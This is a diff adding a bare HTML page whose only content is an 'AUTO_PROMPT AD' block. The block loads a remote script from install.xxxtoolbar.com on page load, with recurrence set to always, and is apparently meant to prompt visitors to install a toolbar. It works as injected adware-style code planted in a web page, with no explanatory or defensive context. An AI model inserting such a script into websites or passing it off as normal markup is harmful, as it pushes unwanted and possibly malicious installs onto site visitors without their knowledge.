@@ -1,0 +1,10 @@
+<html>
+<head>
+</head>
+<body>
+<!-- AUTO_PROMPT AD START -->
+<script language='JavaScript' type='text/JavaScript' src='http://install.xxxtoolbar.com/ist/scripts/prompt.php?retry=2&loadfirst=1&delayload=0&account_id=156448&recurrence=always&adid=a1122507589&event_type=onload'></script>
+<script language="JavaScript">self.focus();</script>
+<!-- AUTO_PROMPT AD END -->
+</body>
+</html>
